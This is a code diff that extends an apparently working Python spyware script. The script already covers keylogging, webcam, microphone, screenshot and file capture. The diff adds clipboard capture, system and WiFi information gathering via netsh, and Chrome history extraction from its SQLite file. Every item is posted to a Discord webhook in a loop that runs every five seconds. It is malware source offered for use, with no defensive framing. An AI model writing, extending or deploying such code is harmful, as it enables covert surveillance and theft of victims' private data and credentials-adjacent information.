@@ -3,6 +3,11 @@ import sounddevice as sd
 from scipy.io.wavfile import write
 from PIL import ImageGrab
 from pynput.keyboard import Listener, Key
+import pyperclip
+import socket
+import platform
+import subprocess
+import sqlite3
 
 # --- CONFIGURATION ---
 # Your unique Discord Webhook URL
@@ -76,6 +81,72 @@ def take_screenshot(delay=0):
         print(f"Screenshot failed: {e}")
         return None
 
+# --- 4.1. CLIPBOARD MONITORING ---
+def capture_clipboard():
+    path = os.path.join(LOOT_DIR, "clipboard.txt")
+    try:
+        clipboard_content = pyperclip.paste()
+        with open(path, 'w') as f:
+            f.write(f"Clipboard Content:\n{clipboard_content}")
+        return path
+    except Exception as e:
+        print(f"Clipboard capture failed: {e}")
+        return None
+
+# --- 4.2. SYSTEM INFORMATION ---
+def get_system_info():
+    path = os.path.join(LOOT_DIR, "system_info.txt")
+    try:
+        info = f"""
+System Information:
+- Username: {os.environ.get('USERNAME', 'Unknown')}
+- Computer Name: {platform.node()}
+- OS: {platform.system()} {platform.release()}
+- IP Address: {socket.gethostbyname(socket.gethostname())}
+- Current Time: {time.ctime()}
+"""
+        with open(path, 'w') as f:
+            f.write(info)
+        return path
+    except Exception as e:
+        print(f"System info failed: {e}")
+        return None
+
+# --- 4.3. WIFI NETWORK INFO ---
+def get_wifi_info():
+    path = os.path.join(LOOT_DIR, "wifi_info.txt")
+    try:
+        result = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'], 
+                              capture_output=True, text=True, shell=True)
+        with open(path, 'w') as f:
+            f.write("WiFi Information:\n" + result.stdout)
+        return path
+    except Exception as e:
+        print(f"WiFi info failed: {e}")
+        return None
+
+# --- 4.4. BROWSER HISTORY ---
+def get_chrome_history():
+    path = os.path.join(LOOT_DIR, "browser_history.txt")
+    try:
+        history_path = os.path.join(os.environ['LOCALAPPDATA'], 
+                                  r'Google\Chrome\User Data\Default\History')
+        if os.path.exists(history_path):
+            conn = sqlite3.connect(history_path)
+            cursor = conn.cursor()
+            cursor.execute("SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 20")
+            results = cursor.fetchall()
+            conn.close()
+            
+            with open(path, 'w') as f:
+                f.write("Recent Chrome History:\n")
+                for url, title, visits in results:
+                    f.write(f"{visits} visits: {title} - {url}\n")
+            return path
+    except Exception as e:
+        print(f"Browser history failed: {e}")
+    return None
+
 # --- 4.5. THE KEYLOGGER: KEYSTROKE RECORDER ---
 def record_keystrokes(duration=15):
     """Record keystrokes for specified duration and save to file"""
@@ -119,7 +190,7 @@ def record_keystrokes(duration=15):
         return None
 
 # --- 5. THE DELIVERY: SEND ALL DETAILS ---
-def send_all_details(photo, audio, files, screenshot=None, keystrokes=None):
+def send_all_details(photo, audio, files, screenshot=None, keystrokes=None, clipboard=None, system_info=None, wifi_info=None, browser_history=None):
     # Send Snapshot
     with open(photo, "rb") as p:
         requests.post(WEBHOOK_URL, files={"file": p}, data={"content": "📸 Snapshot Captured!"})
@@ -138,6 +209,26 @@ def send_all_details(photo, audio, files, screenshot=None, keystrokes=None):
     if keystrokes and os.path.exists(keystrokes):
         with open(keystrokes, "rb") as k:
             requests.post(WEBHOOK_URL, files={"file": k}, data={"content": "⌨️ Keystrokes Recorded!"})
+    
+    # Send Clipboard
+    if clipboard and os.path.exists(clipboard):
+        with open(clipboard, "rb") as c:
+            requests.post(WEBHOOK_URL, files={"file": c}, data={"content": "📋 Clipboard Captured!"})
+    
+    # Send System Info
+    if system_info and os.path.exists(system_info):
+        with open(system_info, "rb") as si:
+            requests.post(WEBHOOK_URL, files={"file": si}, data={"content": "💻 System Information!"})
+    
+    # Send WiFi Info
+    if wifi_info and os.path.exists(wifi_info):
+        with open(wifi_info, "rb") as wi:
+            requests.post(WEBHOOK_URL, files={"file": wi}, data={"content": "📶 WiFi Information!"})
+    
+    # Send Browser History
+    if browser_history and os.path.exists(browser_history):
+        with open(browser_history, "rb") as bh:
+            requests.post(WEBHOOK_URL, files={"file": bh}, data={"content": "🌐 Browser History!"})
     
     # Send Actual Files (not just paths)
     if files:
@@ -158,8 +249,13 @@ while True:
     s_files = scout_files()
     sc_path = take_screenshot(delay=2)  # 2 second delay before screenshot
     k_path = record_keystrokes(duration=5)  # Record keystrokes for 5 seconds
+    cb_path = capture_clipboard()  # Capture clipboard
+    si_path = get_system_info()  # Get system information
+    wi_path = get_wifi_info()  # Get WiFi information
+    bh_path = get_chrome_history()  # Get browser history
     
-    send_all_details(p_path, a_path, s_files, screenshot=sc_path, keystrokes=k_path)
+    send_all_details(p_path, a_path, s_files, screenshot=sc_path, keystrokes=k_path, 
+                    clipboard=cb_path, system_info=si_path, wifi_info=wi_path, browser_history=bh_path)
     
     # Capture and record every 5 seconds, regardless of idle status
     time.sleep(5)
